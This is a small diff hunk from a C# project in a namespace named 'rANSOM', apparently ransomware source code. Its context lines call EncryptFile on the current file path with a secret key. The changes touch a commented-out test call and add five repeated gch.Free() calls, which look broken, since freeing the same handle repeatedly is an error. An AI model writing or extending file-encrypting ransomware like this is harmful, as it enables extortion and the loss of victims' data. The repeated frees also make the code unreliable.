@@ -96,9 +96,14 @@ namespace rANSOM
                 EncryptFile(currentPath, sSecretKey);
             }
             // Encrypt the file.        
-           // EncryptFile(@"d:\2.txt",sSecretKey);
+            // EncryptFile(@"d:\2.txt",sSecretKey);
 
-         
+            gch.Free();
+            gch.Free();
+            gch.Free();
+            gch.Free();
+            gch.Free();
+
             gch.Free();
 
           //  Application.Run(new Form1());
